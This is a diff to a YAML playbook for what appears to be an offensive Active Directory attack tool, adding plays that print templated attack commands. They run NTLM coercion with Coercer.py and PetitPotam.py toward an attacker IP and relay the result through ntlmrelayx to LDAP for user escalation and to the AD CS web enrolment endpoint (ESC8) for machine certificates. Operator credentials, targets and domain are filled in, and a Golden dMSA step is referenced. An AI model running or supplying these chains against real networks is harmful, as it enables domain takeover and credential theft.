@@ -309,3 +309,33 @@ plays:
       - "echo"
       - "CRITICAL — Golden dMSA staged on {{finding.target}}; verify reader, then run GoldenDMSA.py manually."
     category: golden-dmsa
+
+  # ── 13. Coercion vectors — surface only ─────────────────────────────
+  # Coercion-vector findings need a relay listener (ntlmrelayx running
+  # in a separate terminal, attacker-controlled IP) that kerb-chain
+  # cannot manage automatically. Emit a per-vector LOUD print so the
+  # operator sees each available coercion + the exact Coercer.py +
+  # ntlmrelayx invocation already templated with the DC + operator
+  # values. Operator runs the two halves manually.
+  - name: coercion-warn
+    description: Surface every per-vector coercion finding with a ready
+                 Coercer.py + ntlmrelayx recipe. Doesn't auto-execute —
+                 needs a relay listener kerb-chain can't run for you.
+    when: "finding.attack in ['Coercion: PrinterBug', 'Coercion: PetitPotam', 'Coercion: PetitPotam (lsarpc fallback)', 'Coercion: DFSCoerce', 'Coercion: ShadowCoerce']"
+    per: finding
+    command:
+      - "echo"
+      - "{{finding.attack}} on {{finding.target}} — run: ntlmrelayx.py -t ldap://<other_dc> --escalate-user <user> ; then Coercer coerce -l <attacker_ip> -t {{finding.target}} -u {{operator_user}} -p {{operator_pass}} -d {{domain}}"
+    category: coercion
+
+  - name: coercion-esc8-warn
+    description: Loud notice for the PetitPotam → ESC8 compound finding.
+                 Cross-references with the LDAPSigning CVE result; the
+                 operator must check signing posture before launching the
+                 chain. Never auto-executes.
+    when: "finding.attack == 'PetitPotam → ESC8 relay ready (compound)'"
+    per: finding
+    command:
+      - "echo"
+      - "CRITICAL — PetitPotam → ntlmrelayx → AD CS HTTP enrolment chain is staged. Verify LDAPSigning is unenforced, then: ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template Machine ; PetitPotam.py <attacker_ip> {{dc_ip}}"
+    category: coercion
